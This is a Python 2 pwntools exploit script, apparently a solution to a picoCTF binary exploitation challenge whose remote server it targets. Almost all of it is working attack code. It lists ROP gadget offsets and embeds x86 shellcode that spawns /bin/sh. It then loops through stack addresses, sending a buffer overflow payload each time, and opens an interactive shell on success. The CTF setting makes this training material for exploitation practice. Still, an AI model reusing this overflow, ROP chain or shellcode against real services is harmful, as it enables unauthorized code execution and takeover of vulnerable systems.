
from re import match
import struct


from pwn import *
import re, sys

#offset
data_addr = 0x0f000000

mov_eax_edx = 0x00000c91 # mov eax, edx ; ret
mov_p_eax_edx = 0x000010cf #mov dword ptr [eax], edx ; or eax, 0xffffffff ; ret
pop_ebx_edx = 0x00000efb #pop edx ; pop ebx ; pop esi ; ret
int_0x80 = 0x00000726 #int 0x80
xor_eax_eax = 0x000010f2 # xor eax, eax ; ret

mprotect_addr = 0x00000828

stack_addr = 0x1f8a0

#conn = remote('localhost',1337)


#shell = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x00"
shell = "\x90"*16+"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

# for gdb
raw_input()
#stack_addr_s = raw_input()
base_addr = 0x0f000000
#stack_addr = int(stack_addr_s, 16)
stack_addr = 0xfffff000
print hex(base_addr)
count = 0

for i in xrange(10240):
	count += 1
	stack_addr -= 0x2000
	print "[+]"+str(count)+":"+hex(stack_addr)
	conn = remote('nttvuln2014.picoctf.com',4000)
#	conn = remote('localhost',1337)
	line = conn.recvuntil('yo, what\'s up?')
	print line
#	sleep(5)
	conn.send("0005")
	line = conn.recvuntil('ROP time!')
	print line

	cmd ='A'*32


#0x0000692f : push esp ; ret
	cmd += struct.pack("<I", base_addr+0x0000692f)


	cmd += shell


#0x00003d9d : pop eax ; ret


#0x00003a43 : pop ebx ; ret

#0x00001187 : pop ecx ; ret
#0x00002d1d : pop edx ; ret
#0x0000459b : pop esi ; ret


#0x00002202 : int 0x80


#	sleep(5)
	conn.send(cmd+"\n")
#	sleep(10)
	line = conn.recv()

	print line


	line = conn.send("ls\n")
#	line = conn.recv()

	try:
		line = conn.recv(timeout=1)
	except:
		print "except"
		conn.close()
		continue


	if line =='':
		print "True"
	else:
		conn.interactive()

	conn.close()
	'''
	conn.recvn(10, timeout=0.05)

	if conn.connected():
		print "True"
		conn.interactive()
	else:
		print "False"
		continue
'''
